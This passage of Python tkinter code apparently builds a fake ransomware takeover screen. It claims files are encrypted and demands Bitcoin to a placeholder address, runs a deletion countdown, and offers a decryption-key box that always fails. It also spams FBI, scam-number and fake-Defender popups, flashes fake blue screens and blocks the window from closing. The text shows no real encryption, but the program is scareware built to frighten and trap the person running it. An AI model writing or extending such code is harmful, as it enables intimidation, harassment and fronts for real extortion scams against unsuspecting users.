        font=('Consolas',10), fg='#660000', bg='#000000').pack(pady=6)

    lbl(cf, 'All documents, photos, databases, videos and personal files on this computer\n'
            'have been encrypted with AES-256 + RSA-4096 military-grade encryption.\n'
            'Without the private key — your files CANNOT be recovered.',
        font=('Consolas', max(10, SW//160)), fg='#ff6600', bg='#000000',
        justify='center').pack(pady=4)

    lbl(cf, '━' * min(70, SW//14),
        font=('Consolas',10), fg='#660000', bg='#000000').pack(pady=6)

    # Stats
    sf = tk.Frame(cf, bg='#000000'); sf.pack(pady=4)
    files_enc = random.randint(11400, 28600)
    for left, right in [
        ('Files encrypted:', f'{files_enc:,}'),
        ('Data size:',       f'{random.randint(80,420)} GB'),
        ('Encryption:',      'AES-256-CBC + RSA-4096'),
        ('Malware family:',  random.choice(['KRAKEN 4.2','LockBit 3.0','DarkSide v4','BlackCat'])),
        ('Origin server:',   random.choice(COUNTRIES)),
        ('C2 address:',      random.choice(C2_IPS)),
    ]:
        rf = tk.Frame(sf, bg='#000000'); rf.pack(anchor='center', pady=1)
        lbl(rf, f'{left:<22}', font=('Consolas', max(11,SW//150)),
            fg='#666666', bg='#000000').pack(side='left')
        lbl(rf, right, font=('Consolas', max(11,SW//150),'bold'),
            fg='#ff4400', bg='#000000').pack(side='left')

    lbl(cf, '━' * min(70, SW//14),
        font=('Consolas',10), fg='#660000', bg='#000000').pack(pady=6)

    # Payment demand
    lbl(cf, f'⚠  SEND  {BTC_AMOUNT} BTC  TO RECOVER YOUR FILES  ⚠',
        font=('Impact', max(20,SW//56)), fg='#ffff00', bg='#000000').pack(pady=4)
    lbl(cf, f'Bitcoin address:  {BTC_ADDR}',
        font=('Consolas', max(10,SW//170),'bold'), fg='#ffcc00', bg='#000000').pack()

    # BTC price (fake live ticker)
    btc_usd = random.randint(84000, 97000)
    btc_v   = tk.StringVar(value=f'{BTC_AMOUNT} BTC = ${float(BTC_AMOUNT)*btc_usd:,.2f} USD')
    lbl(cf, textvariable=btc_v, font=('Consolas', max(10,SW//170)),
        fg='#ff8800', bg='#000000').pack()
    def _btc_tick():
        if not w.winfo_exists(): return
        nonlocal btc_usd
        btc_usd += random.randint(-300, 300)
        btc_v.set(f'{BTC_AMOUNT} BTC = ${float(BTC_AMOUNT)*btc_usd:,.2f} USD  '
                  f'{"▲" if random.random()>.4 else "▼"} live')
        w.after(4000, _btc_tick)
    _btc_tick()

    lbl(cf, '━' * min(70, SW//14),
        font=('Consolas',10), fg='#660000', bg='#000000').pack(pady=6)

    # Countdown
    lbl(cf, '⏱  TIME REMAINING BEFORE PERMANENT FILE DELETION:',
        font=('Consolas', max(11,SW//160)), fg='#ff8800', bg='#000000').pack()
    timer_v = tk.StringVar()
    lbl(cf, textvariable=timer_v,
        font=('Impact', max(54, SW//17)), fg='#ff0000', bg='#000000').pack(pady=2)

    # Files-being-deleted live counter
    del_v = tk.StringVar(value='Files permanently deleted: 0')
    lbl(cf, textvariable=del_v,
        font=('Consolas', max(9,SW//180),'bold'), fg='#ff2200', bg='#000000').pack()

    # Fake decryption key entry (never works)
    lbl(cf, '\nEnter decryption key (provided after payment):',
        font=('Consolas', max(9,SW//180)), fg='#888888', bg='#000000').pack()
    key_f = tk.Frame(cf, bg='#000000'); key_f.pack(pady=4)
    key_e = tk.Entry(key_f, font=('Consolas',12), bg='#111111', fg='white',
                     insertbackground='white', width=40, relief='flat',
                     highlightthickness=1, highlightbackground='#440000')
    key_e.pack(side='left', padx=(0,8))
    key_msg = tk.StringVar()
    key_lbl = lbl(cf, textvariable=key_msg,
                  font=('Consolas',10,'bold'), fg='#ff0000', bg='#000000')
    key_lbl.pack()
    def _try_key(_e=None):
        key_msg.set('⛔  INVALID DECRYPTION KEY — SERVER REJECTED')
        sys_sound('SystemExclamation')
        key_e.delete(0, 'end')
        threading.Thread(
            target=lambda:[kernel32.Beep(880,60), time.sleep(.08), kernel32.Beep(440,120)],
            daemon=True).start()
    key_e.bind('<Return>', _try_key)
    tk.Button(key_f, text='SUBMIT', command=_try_key,
              font=('Consolas',11,'bold'), bg='#440000', fg='white',
              relief='flat', padx=10, pady=4).pack(side='left')

    # ── Live timers ───────────────────────────────────────────────────────────
    secs = [23*3600 + 59*60 + 59]
    deleted = [0]

    def _tick_timer():
        if not w.winfo_exists(): return
        h, rem = divmod(secs[0], 3600); m, s = divmod(rem, 60)
        timer_v.set(f'{h:02d}:{m:02d}:{s:02d}')
        if secs[0] > 0:
            secs[0] -= 1
            # Occasionally "delete" a file
            if random.random() < 0.15:
                deleted[0] += random.randint(1, 4)
                del_v.set(f'Files permanently deleted: {deleted[0]:,}')
        w.after(1000, _tick_timer)

    _tick_timer()

    # ── Continuous popup spam every 4-9 seconds ───────────────────────────────
    _popup_fns = [_popup_defender_mini, _popup_cmd_flash, _popup_process_list,
                  _popup_photo_upload, _popup_fbi, _popup_thermal, _popup_scam_number]
    def _spam_loop():
        while True:
            time.sleep(random.uniform(4, 9))
            if not w.winfo_exists(): break
            fn = random.choice(_popup_fns)
            root.after(0, fn)
    threading.Thread(target=_spam_loop, daemon=True).start()

    # ── BSOD flashes ──────────────────────────────────────────────────────────
    def _schedule_bsod():
        if not w.winfo_exists(): return
        root.after(0, _fake_bsod_flash)
        w.after(random.randint(25000, 40000), _schedule_bsod)
    w.after(20000, _schedule_bsod)

    # Initial popup burst
    for d, fn in [(800,_popup_defender_mini),(1600,_popup_cmd_flash),
                  (3000,_popup_process_list),(5000,_popup_photo_upload)]:
        root.after(d, fn)

# ══════════════════════════════════════════════════════════════════════════════
# BSOD FLASH
# ══════════════════════════════════════════════════════════════════════════════
def _fake_bsod_flash():
    def _bsound():
        for f in [120,100,80,60]: kernel32.Beep(f,200); time.sleep(.05)
    threading.Thread(target=_bsound, daemon=True).start()

    b = toplevel(w=SW, h=SH, bg='#0000AA', x=0, y=0)
    STOP = random.choice(['0x0000007E','0x00000050','0xC000021A','0xDEADBEEF',
                          '0x000000EF','0xC0000005','0xDEADC0DE'])
    lbl(b, ':(',  font=('Segoe UI', max(80,SW//11)), fg='white', bg='#0000AA').pack(pady=(70,8))
    lbl(b, "Your PC ran into a problem and needs to restart.\n"
           "We're just collecting some error info, and then we'll restart for you.",
        font=('Segoe UI', max(16,SW//88)), fg='white', bg='#0000AA',
        justify='left').pack(pady=8)
    pf = tk.Frame(b, bg='#0000AA'); pf.pack(pady=16)
    pct_v = tk.StringVar(value='0% complete')
    lbl(pf, textvariable=pct_v, font=('Segoe UI', max(14,SW//100)),
        fg='white', bg='#0000AA').pack()
    lbl(b, f'Stop code:  RANSOMWARE_KERNEL_PANIC  {STOP}',
        font=('Consolas', max(11,SW//130)), fg='white', bg='#0000AA').pack(pady=6)
    lbl(b, f'What failed:  KRAKENdriver_{random.randint(100,999)}.sys',
        font=('Consolas', max(10,SW//140)), fg='white', bg='#0000AA').pack()

    p = [0]
    def _count():
        if not b.winfo_exists(): return
        p[0] = min(p[0]+1, 35)
        pct_v.set(f'{p[0]}% complete')
        if p[0] < 35: b.after(80, _count)
        else:         b.after(1800, lambda: b.destroy() if b.winfo_exists() else None)
    _count()

# ══════════════════════════════════════════════════════════════════════════════
# ENTRY — initial popup blast then Phase 1
# ══════════════════════════════════════════════════════════════════════════════
# Block root from closing normally
root.protocol("WM_DELETE_WINDOW", _on_close_attempt)

# Staggered opening salvo
for delay, fn in [(0,   _popup_defender_mini),
                  (400, _popup_cmd_flash),
                  (900, _popup_defender_mini),
                  (1400,_popup_process_list)]:
    root.after(delay, fn)

# Phase 1 starts after brief terrifying intro
root.after(1200, phase1_defender)

root.mainloop()
